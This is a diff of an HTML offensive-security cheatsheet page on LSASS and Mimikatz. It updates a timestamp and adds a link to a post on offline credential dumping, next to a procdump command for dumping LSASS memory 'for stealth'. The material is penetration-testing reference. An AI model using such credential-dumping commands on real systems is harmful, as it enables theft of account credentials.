@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-09-28T18:26:38 CEST">
+<meta name="revised" content="2020-10-11T16:30:26 CEST">
 <title>LSASS and Mimikatz :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1748,7 +1748,10 @@
 <h3 id="lsass">LSASS</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Avoiding running Mimikatz on the target can be a nice solution for stealth</span>
 <span style="color:#75715e"># You can just dump the LSASS process, get them and parse it locally</span>
-procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre></div>
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+<span style="color:#75715e"># Several dumping methods here</span>
+https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/</code></pre></div>
 <p><br/></p>
 
 <h3 id="mimikatz">Mimikatz</h3>
